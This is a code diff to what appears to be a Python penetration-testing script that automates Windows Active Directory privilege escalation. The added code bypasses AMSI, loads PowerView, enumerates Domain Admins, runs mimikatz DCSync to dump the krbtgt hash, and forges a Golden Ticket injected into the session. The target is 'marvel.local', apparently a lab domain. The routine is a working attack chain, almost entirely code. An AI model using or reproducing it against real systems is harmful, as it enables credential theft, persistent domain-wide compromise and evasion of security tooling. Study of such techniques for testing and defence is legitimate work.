@@ -4,7 +4,7 @@ import time,os,sys
 
 #Starting with the hacking 
 def stepFOUR_PrivilegeEsc():
-    print(f"\n{ok} 4-Starting with elevate privileges to local administrator...\n")
+    print(f"\n{ok} 4-Starting with check vulnerabilities to elevate privileges ...\n")
     print(f"{warning} A- Check Unquoted path services vulnerabilities...")
     checking=0
     while(checking==0):
@@ -66,7 +66,6 @@ def stepFOUR_PrivilegeEsc():
     #bypass=configurazione()
     #command0=bypass + "; " + f"Import-Module {data}PowerUp.ps1" + "; "
     command1=' Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"'
-
     try:
         value=powershell_commandLine(command1)
         value=cleanstring(value)
@@ -195,7 +194,54 @@ def stepFOUR_PrivilegeEsc():
     except Exception as e:
         print(f"{error} General Error: {e}")
 
-
+    print(f"\n{warning} F- Get Golden Ticket using krbtgt...")
+    time.sleep(1)
+    print(f"{ok} Bypassing AMSI Security...\n")
+    bypass=configurazione()
+    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
+    command1=command0 + 'Get-NetGroupMember -Name "Domain Admins"'
+    try:
+        value=powershell_commandLine(command1)
+        value=cleanstring(value)
+        print(value)
+        value2=value.split("\n")
+        if(len(value2) == 1):
+            print(f"\n{error} No users in Domain Admins FOUND\n")
+        else:
+            print(f"\n{ok} Users in Domain Admins FOUND\n")
+            value=powershell_commandLine("whoami")
+            value=cleanstring(value)
+            account=value.split("\\")[1]
+            trovato=0
+            for item in value2:
+                if("MemberName" in item):
+                    member=item.split(":")[1].strip()
+                    if account==member:
+                        trovato=1
+                        print(f"{ok} This account can get golden ticket")
+                        time.sleep(1)
+                        value=powershell_commandLine(f"{mimikatz} 'lsadump::dcsync /domain:marvel.local /user:krbtgt ' 'exit'")
+                        value=cleanstring(value)
+                        print(value)
+                        command22=command0 + " Get-DomainSID"
+                        value=powershell_commandLine(command22)
+                        domainSID=cleanstring(value)
+                        command12=command0 + " Get-NetDomain"
+                        value=powershell_commandLine(command12)
+                        value=cleanstring(value)
+                        value_list=value.split("\n")
+                        domain=value_list[-1].split(":")[1].rstrip().strip()
+                        ntlm=input(f"{warning} Insert NTLM HASH of krbtgt': ")
+                        value=powershell_commandLine(f"{mimikatz} 'kerberos::golden /domain:{domain} /sid:{domainSID} /rc4:{ntlm} /id:500 /user:{account} /ptt' 'exit'")
+                        value=powershell_commandLine("klist")
+                        value=cleanstring(value)
+                        print(value)
+            
+            if(trovato==0):
+                print(f"{error} This account cannot get golden ticket")
+            
+    except Exception as e:
+        print(f"{error} General Error: {e}")
     
     sys.exit(0)
     print(f"{warning} Check if this domain user has access to a server where a domain admin is logged in...")
